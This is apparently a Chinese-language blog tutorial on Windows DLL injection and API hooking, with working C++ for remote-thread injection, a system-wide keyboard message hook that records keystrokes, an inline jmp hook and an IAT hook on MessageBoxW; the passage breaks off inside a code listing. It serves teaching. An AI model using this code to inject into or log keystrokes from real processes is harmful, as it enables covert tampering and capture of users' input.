DLL注入的方式有哪些？？</p><p>   远程线程注入</p><p>   消息钩子注入</p><p>   注册表注入</p><p>   APC注入</p><p>   输入法注入</p><h2 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLLPATH  <span class="meta-string">L&quot;DLL地址&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//通过ID获得目标句柄</span></span><br><span class="line">HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,<span class="number">9740</span>);</span><br><span class="line"><span class="comment">//先获取字符串长度</span></span><br><span class="line"><span class="keyword">int</span>  nLength = wcslen(DLLPATH);</span><br><span class="line"><span class="comment">//在目标进程中申请一块空间</span></span><br><span class="line">LPVOID address = VirtualAllocEx(hHandle,<span class="number">0</span>, nLength*<span class="number">2</span>+<span class="number">2</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line"><span class="comment">//将DLL名字写入到目标进程之前还需要一个参数是返回的实际写入大小</span></span><br><span class="line">DWORD dwConst = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//将DLL名字写入到目标进程空间</span></span><br><span class="line">WriteProcessMemory(hHandle, address,DLLPATH, nLength * <span class="number">2</span> + <span class="number">2</span>, &amp;dwConst);</span><br><span class="line"><span class="comment">//创建远程线程</span></span><br><span class="line">HANDLE hRhread = CreateRemoteThread(hHandle,<span class="number">0</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)LoadLibrary, address,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="comment">//等待线程执行完成</span></span><br><span class="line">WaitForSingleObject(hRhread,<span class="number">-1</span>);</span><br><span class="line"><span class="comment">//销毁在目标进程申请的空间</span></span><br><span class="line">VirtualFreeEx(hHandle, address, nLength * <span class="number">2</span> + <span class="number">2</span>,MEM_COMMIT);</span><br><span class="line"><span class="comment">//线程计数-1</span></span><br><span class="line">CloseHandle(hRhread);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>4  关于64位的注入</p><p>  32位的dll正常情况只能注入到32位程序中，注入程序也应该是32位，64位的dll正常情况只能注入到64位的程序中，注入程序也应该是64位。</p><h2 id="消息钩子注入"><a href="#消息钩子注入" class="headerlink" title="消息钩子注入"></a>消息钩子注入</h2><p> 什么是Hook，这个概念应该从何说起？？？</p><p>  Hook：是钩子的意思</p><p>  Hook技术主要指的是<strong>拦截</strong>程序原有的信息，数据，代码，</p><p>  1 使得你有机会对拦截到的信息数据做处理。然后再交给原来的程序去使用，从而能够截获到程序的关键信息。可以查看，也可以修改。</p><p>  2  能够修改程序的部分功能。</p><p>2  Hook是怎么分类的？？</p><p>   在windows系统下，有两类Hook：</p><p>   2.1  windows消息Hook。windows提供的能够让程序员截获到所有窗口程序消息的机制。</p><p>​       消息Hook也是我们的一种Dll注入手段。</p><p>   2.2  自定义Hook  非常普遍的Hook方式，也是我们通常意义所说的Hook。</p><p>​      2.2.1  修改程序的代码，使得其能够执行到Hook者提供的“善意代码”中。  inline-Hook</p><p>​      2.2.2  修改存储函数地址的变量，当程序从变量中获取函数地址并调用的时候，就会调用到Hook者提供的“善意代码”了。</p><p>​           IAT-Hook  </p><p>​           IDT-Hook</p><p>​           SYSENTR-Hook</p><p>3  windows消息钩子的实现的原理以及代码</p><p>  3.1 windows消息钩子的实现的原理</p><p>  SetWindowsHookEx这个函数，能够实现的功能是截获  1 系统中所有的窗口程序的消息或者 2 某一个线程的窗口消息。</p><p>  截获到了消息，必然是需要执行自己的代码，自己的代码需要放置在一个dll中，然后消息钩子设置成功之后，会将dll注入到目标进程，从而使得自己的回调函数能够在对方的进程中执行。</p><p>  额外的知识点：窗口程序的消息是被某一个线程获取到的，哪一个线程创建了窗口，哪一个线程就能够获得此窗口的消息。此线程在创建完窗口之后，就变成了GUI线程。</p><p>1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK <span class="title">SetWindowsHookExA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">int</span>       idHook,   <span class="comment">// 要截获的是哪种类型的消息</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HOOKPROC  lpfn,     <span class="comment">//截获到消息之后，调用的回调函数</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HINSTANCE hmod,     <span class="comment">//回调函数所在的模块，这个模块需要是一个dll。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwThreadId  <span class="comment">//填0  截获系统中所有的窗口的消息  填线程ID  那就仅截获此线程的窗口消息</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//当钩子使用完毕之后，卸载钩子</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">UnhookWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ HHOOK hhk      <span class="comment">//填充返回的句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br></pre></td></tr></table></figure><p>在钩子的消息拦截函数的最后，应该调用这个函数，因为程序可能会有多个钩子，新添加的在最上面，为了不影响其他钩子的功能，需要调用这个函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WINUSERAPI</span><br><span class="line">LRESULT</span><br><span class="line">WINAPI</span><br><span class="line">CallNextHookEx(</span><br><span class="line">    _In_opt_ HHOOK hhk,    <span class="comment">//钩子的句柄</span></span><br><span class="line">    _In_ <span class="keyword">int</span> nCode,</span><br><span class="line">    _In_ WPARAM wParam,</span><br><span class="line">    _In_ LPARAM lParam);</span><br></pre></td></tr></table></figure><p>消息钩子的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _countof(a) sizeof(a)/sizeof(a[0])</span></span><br><span class="line">HHOOK g_Hook = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//拦截消息的回调函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> code,           <span class="comment">// 消息类型</span></span></span></span><br><span class="line"><span class="function"><span class="params">    WPARAM wParam,      <span class="comment">// 虚拟码</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPARAM lParam)</span> </span>&#123;    <span class="comment">// 按键信息</span></span><br><span class="line">    <span class="comment">// 判断是否wParam与lParam都有键盘消息，是的话则执行打印操作</span></span><br><span class="line">    <span class="keyword">if</span> (code == HC_ACTION) &#123;</span><br><span class="line">        <span class="comment">// 将256个虚拟键的状态拷贝到指定的缓冲区中，如果成功则继续</span></span><br><span class="line">        BYTE KeyState[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="keyword">if</span> (GetKeyboardState(KeyState)) &#123;</span><br><span class="line">            <span class="comment">// 得到第16–23位，键盘虚拟码</span></span><br><span class="line">            LONG  KeyInfo = lParam;</span><br><span class="line">            UINT  keyCode = (KeyInfo &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x00ff</span>;</span><br><span class="line">            WCHAR wKeyCode = <span class="number">0</span>;</span><br><span class="line">            ToAscii((UINT)wParam, keyCode, KeyState, (LPWORD)&amp;wKeyCode, <span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 将其打印出来</span></span><br><span class="line">            WCHAR szInfo[<span class="number">512</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">            swprintf_s(szInfo, _countof(szInfo), <span class="string">L&quot;Hook_%c&quot;</span>, (<span class="keyword">char</span>)wKeyCode);</span><br><span class="line">            OutputDebugString(szInfo);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(g_Hook, code, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//开启Hook的函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hModule =  GetModuleHandle(<span class="string">L&quot;MessageHookdll.dll&quot;</span>);</span><br><span class="line">    g_Hook = SetWindowsHookEx(</span><br><span class="line">        WH_KEYBOARD,</span><br><span class="line">        KeyboardProc,</span><br><span class="line">        hModule,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//关闭Hook的函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_Hook!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        UnhookWindowsHookEx(g_Hook);</span><br><span class="line">        g_Hook = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>消息钩子使用了调试函数 OutputDebugString(szInfo);输出按键码，但我们看不到对方程序的调试信息，可以通过下图程序查看</p><img src="CodeInjection/DebugView.jpg" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>自定义钩子：</p><p>自定义钩子两大类：内联钩子     修改存储函数地址变量的钩子</p><p>4.1  什么是内联钩子  inline-Hook</p><p>任何位置，都可以修改为jmp，使其执行到此处时，能够跳转到我们自己的代码去执行：</p><p>1  被修改的指令，是否是有用的，如果是有用的，那么你就需要在你自己的代码中，将有用的指令写一遍，使其在你代码中能够执行。</p><p>2  jmp指令一般是5个字节，所以我们选取的指令最好也是5个字节，如果不是5个字节，那么会发生指令截断，跳转回来的时候，就需要考虑跳转到完整的指令后去执行程序本身的代码。</p><p>3  jmp指令OPCODE的操作数怎么求得，也是Hook的关键知识点</p><p>jmp指令OPCODE的操作数  =  要跳转的目标地址-hook点所在的地址-5</p><h2 id="DLL测试代码"><a href="#DLL测试代码" class="headerlink" title="DLL测试代码"></a>DLL测试代码</h2><h3 id="InLine-HOOK"><a href="#InLine-HOOK" class="headerlink" title="InLine_HOOK"></a>InLine_HOOK</h3><p>.h文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OffHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitHook</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>.cpp文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;HookMessageBox.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> g_NewCode[<span class="number">5</span>] = &#123; <span class="number">0xE9</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> g_OldCode[<span class="number">5</span>] = &#123;  &#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OffHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MyMessageBoxW</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ LPCWSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ LPCWSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_ UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">lpText = (<span class="keyword">wchar_t</span>*)<span class="string">L&quot;你被打劫了^_^&quot;</span>;</span><br><span class="line">DWORD dwReturnCode = <span class="number">0</span>;</span><br><span class="line">OffHook();</span><br><span class="line">dwReturnCode = MessageBoxW(hWnd, lpText, lpCaption, uType);</span><br><span class="line">OnHook();</span><br><span class="line"><span class="keyword">return</span> dwReturnCode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 得到Hook的指令</span></span><br><span class="line">DWORD dwOffset = (DWORD)MyMessageBoxW - (DWORD)MessageBoxW - <span class="number">5</span>;</span><br><span class="line"><span class="comment">//*(PDWORD)(code + 1) = dwOffset;</span></span><br><span class="line"><span class="built_in">memcpy</span>(g_NewCode + <span class="number">1</span>, &amp;dwOffset, <span class="number">4</span>);</span><br><span class="line"><span class="comment">//2 得到原始的指令</span></span><br><span class="line"><span class="built_in">memcpy</span>(g_OldCode, MessageBoxW, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1 修改Hook点的属性</span></span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">VirtualProtect(MessageBoxW, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"><span class="comment">//2 修改指令</span></span><br><span class="line"><span class="built_in">memcpy</span>(MessageBoxW, g_NewCode,<span class="number">5</span>);</span><br><span class="line"><span class="comment">//3 属性还原</span></span><br><span class="line">VirtualProtect(MessageBoxW, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OffHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 改属性</span></span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">VirtualProtect(MessageBoxW, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"><span class="comment">//2 改指令</span></span><br><span class="line"><span class="built_in">memcpy</span>(MessageBoxW, g_OldCode, <span class="number">5</span>);</span><br><span class="line"><span class="comment">//3 属性还原</span></span><br><span class="line">VirtualProtect(MessageBoxW, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dllmain.cpp文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;HookMessageBox.h&quot;</span></span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">&#123;</span><br><span class="line">InitHook();</span><br><span class="line">OnHook();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">&#123;</span><br><span class="line">OffHook();</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IAT-HOOK"><a href="#IAT-HOOK" class="headerlink" title="IAT_HOOK"></a>IAT_HOOK</h3><p>.h文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IatHook</span><span class="params">(<span class="keyword">char</span>* lpModuleAddress, DWORD FunAddress, <span class="keyword">const</span> <span class="keyword">char</span>* szTarFunName, <span class="keyword">const</span> <span class="keyword">char</span>* szTarDllName = <span class="literal">NULL</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MyMessageBoxW</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ LPCWSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ LPCWSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_ UINT uType)</span></span>;</span><br></pre></td></tr></table></figure><p>.cpp文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;IATHookMessageBoxW.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI* MESSAGEBOX)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ LPCWSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ LPCWSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_ UINT uType)</span></span>;</span><br><span class="line">MESSAGEBOX g_OldMessageBox;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IatHook</span><span class="params">(<span class="keyword">char</span>* lpModuleAddress, DWORD FunAddress, <span class="keyword">const</span> <span class="keyword">char</span>* szTarFunName, <span class="keyword">const</span> <span class="keyword">char</span>* szTarDllName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取到导入表结构</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpModuleAddress;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpModuleAddress);</span><br><span class="line"><span class="comment">//1 获取到导入表的数据目录结构</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY dwImportDir = &amp;pNt-&gt;OptionalHeader.DataDirectory[<span class="number">1</span>];</span><br><span class="line"><span class="comment">//1 获取到导入表结构</span></span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImportTable =</span><br><span class="line">(PIMAGE_IMPORT_DESCRIPTOR)(lpModuleAddress + dwImportDir-&gt;VirtualAddress);</span><br><span class="line"><span class="comment">//2 解析导入表</span></span><br><span class="line"><span class="comment">//2 开始解析</span></span><br><span class="line"><span class="keyword">while</span> (pImportTable-&gt;Name != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* pDllName = (pImportTable-&gt;Name + lpModuleAddress);</span><br><span class="line"><span class="keyword">char</span>* pbuf = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(pDllName) + <span class="number">1</span>]&#123; <span class="number">0</span> &#125;;</span><br><span class="line">strcpy_s(pbuf, <span class="built_in">strlen</span>(pDllName) + <span class="number">1</span>, pDllName);</span><br><span class="line">_strlwr_s(pbuf, <span class="built_in">strlen</span>(pDllName) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (szTarDllName != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(szTarDllName, pbuf) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//得到目标函数的地址</span></span><br><span class="line">HMODULE hModule = GetModuleHandleA(pDllName);</span><br><span class="line">DWORD dwTarAddress = (DWORD)GetProcAddress(hModule, szTarFunName);</span><br><span class="line"><span class="comment">//在IAT中寻找这个函数地址</span></span><br><span class="line">PIMAGE_THUNK_DATA32 pIat = (PIMAGE_THUNK_DATA32)</span><br><span class="line">(pImportTable-&gt;FirstThunk + lpModuleAddress);</span><br><span class="line"><span class="keyword">while</span> (pIat-&gt;u1.Function!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//找到了之后开始Hook，IAT也是不可写的</span></span><br><span class="line"><span class="keyword">if</span> (pIat-&gt;u1.Function == dwTarAddress)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存了一下MessageBox的地址。</span></span><br><span class="line">g_OldMessageBox = (MESSAGEBOX)pIat-&gt;u1.Function;</span><br><span class="line"><span class="comment">//1 修改Hook点的属性</span></span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">VirtualProtect(&amp;pIat-&gt;u1.Function, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">pIat-&gt;u1.Function = FunAddress;</span><br><span class="line">VirtualProtect(&amp;pIat-&gt;u1.Function, <span class="number">4</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line">pIat++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">pImportTable++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MyMessageBoxW</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ LPCWSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ LPCWSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_ UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">lpText = (<span class="keyword">wchar_t</span>*)<span class="string">L&quot;你被打劫了^_^&quot;</span>;</span><br><span class="line">DWORD dwReturnCode = <span class="number">0</span>;</span><br><span class="line">dwReturnCode = g_OldMessageBox(hWnd, lpText, lpCaption, uType);</span><br><span class="line"><span class="keyword">return</span> dwReturnCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dllmain.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span 